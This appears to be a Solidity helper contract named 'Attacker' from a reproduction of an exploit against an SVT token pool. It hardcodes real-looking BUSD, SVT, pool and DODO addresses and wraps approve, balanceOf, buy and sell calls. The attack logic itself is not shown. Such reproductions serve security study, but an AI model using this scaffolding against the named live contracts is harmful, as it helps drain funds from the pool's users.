// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./interface.sol";

contract Attacker {
    IERC20 public BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 public SVT = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281);
    ISVTpool public pool = ISVTpool(0x2120F8F305347b6aA5E5dBB347230a8234EB3379); 
    address public dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    function approve(address _IERC20, address _to, uint256 _amount) public {
        IERC20(_IERC20).approve(_to, _amount);
    }

    function balanceOf(address _IERC20, address _addr) public returns(uint256) {
        return IERC20(_IERC20).balanceOf(_addr);
    }

    function buy(uint256 _amount) public {
        pool.buy(_amount);
    }

    function sell(uint256 _amount) public {
        pool.sell(_amount);
    }
}